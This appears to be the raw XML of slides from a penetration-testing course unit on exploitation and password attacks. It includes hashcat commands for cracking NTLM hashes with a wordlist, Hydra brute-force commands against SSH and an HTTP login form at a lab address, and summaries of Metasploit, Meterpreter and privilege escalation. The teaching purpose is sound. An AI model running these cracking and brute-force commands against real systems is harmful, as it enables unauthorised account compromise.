              <a:gd name="adj" fmla="val 12069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B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41832" y="2971800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F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hashcat --identify hashes.txt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6002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EEF2F6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17647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Crack with the Right Mode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0" y="214884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 selects the hash mode, -a the attack type (0 = dictionary). The mode must match the algorithm found in step 1, or the attempt silently fails.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0" y="2862072"/>
            <a:ext cx="4983480" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12069"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2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65392" y="2971800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F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hashcat -m 1000 -a 0 hashes.txt rockyou.txt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Hashcat Modes (-m)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4178808"/>
            <a:ext cx="2606040" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2A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41788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</a:t>
            </a:r>
            <a:pPr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291840" y="4178808"/>
            <a:ext cx="2606040" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="41788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 </a:t>
            </a:r>
            <a:pPr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SHA-1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035040" y="4178808"/>
            <a:ext cx="2606040" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="41788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  </a:t>
            </a:r>
            <a:pPr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NTLM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778240" y="4178808"/>
            <a:ext cx="2606040" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8915400" y="41788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1800  </a:t>
            </a:r>
            <a:pPr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sha512crypt / Linux shadow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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3/icons/un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509138"/>
            <a:ext cx="298460" cy="2984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 — Online Brute-Force Attacks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0789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John and Hashcat — which crack stolen hashes offline — Hydra attacks a live login service directly over the network, submitting many username / password combinations against it in real time.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EEF2F6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0116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SSH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39572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each password in the list for the given username over an SSH login.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971800"/>
            <a:ext cx="4983480" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6364"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B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41832" y="3081528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F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hydra -l admin -P rockyou.txt \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F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ssh://10.10.1.20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82880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EEF2F6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20116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an HTTP Login Form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0" y="239572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http-post-form module maps Hydra's guesses onto the form's own field names, and a failure string tells a bad login apart from a good one.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0" y="2971800"/>
            <a:ext cx="4983480" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6364"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B2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65392" y="3081528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F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hydra -l admin -P rockyou.txt 10.10.1.20 \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F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http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=incorrect"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</p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4544568"/>
            <a:ext cx="457200" cy="45720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8" name="Image 1" descr="/home/claude/unit3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4663440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71600" y="44348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attacks are far slower than offline cracking, generate heavy network traffic, and easily trigger account lockouts or IDS/IPS alerts.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3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621792" cy="621792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3" name="Image 0" descr="/home/claude/unit3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509138"/>
            <a:ext cx="298460" cy="2984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— Unit III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475488" cy="475488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6" name="Image 1" descr="/home/claude/unit3/icons/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67" y="1358067"/>
            <a:ext cx="228234" cy="2282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61872" y="11887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 organizes exploitation into libraries, interfaces and modules, all driven through msfconsole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548640" y="2221992"/>
            <a:ext cx="475488" cy="475488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9" name="Image 2" descr="/home/claude/unit3/icons/pack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2345619"/>
            <a:ext cx="228234" cy="2282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61872" y="217627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choice (staged vs stageless) plus a correctly matched listener determine whether a session opens at all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548640" y="3209544"/>
            <a:ext cx="475488" cy="475488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12" name="Image 3" descr="/home/claude/unit3/icons/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7" y="3333171"/>
            <a:ext cx="228234" cy="22823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61872" y="3163824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Meterpreter turns initial access into deep situational awareness — and post modules automate that enumeration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548640" y="4197096"/>
            <a:ext cx="475488" cy="475488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15" name="Image 4" descr="/home/claude/unit3/icons/escala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67" y="4320723"/>
            <a:ext cx="228234" cy="22823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61872" y="4151376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 exploits misconfigurations: sudo rights and SUID binaries on Linux; service paths, registry permissions and tokens on Windows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548640" y="5184648"/>
            <a:ext cx="475488" cy="475488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18" name="Image 5" descr="/home/claude/unit3/icons/k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267" y="5308275"/>
            <a:ext cx="228234" cy="22823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61872" y="513892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attacks split into offline cracking (John, Hashcat) and online brute force (Hydra) — each demands the right hash ID or attack mode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3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828800"/>
            <a:ext cx="914400" cy="91440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3" name="Image 0" descr="/home/claude/unit3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1536" y="207568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Unit III — System Exploitation &amp; Post-Exploitation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937760" y="4434840"/>
            <a:ext cx="228600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Unit IV — Web Application Penetration Testing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Ops">
  <a:themeElements>
    <a:clrScheme name="CyberOps">
      <a:dk1>
        <a:srgbClr val="0D1B2A"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="16293F"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="EEF2F6"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="00B894"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="FF7A45"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="16293F"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="8395A7"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="EEF2F6"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="0D1B2A"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="00B894"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="00B894"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="CyberOp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2026-10-26T07:38:25Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-26T07:38:25Z</dcterms:modified>
</cp:coreProperties>
</file>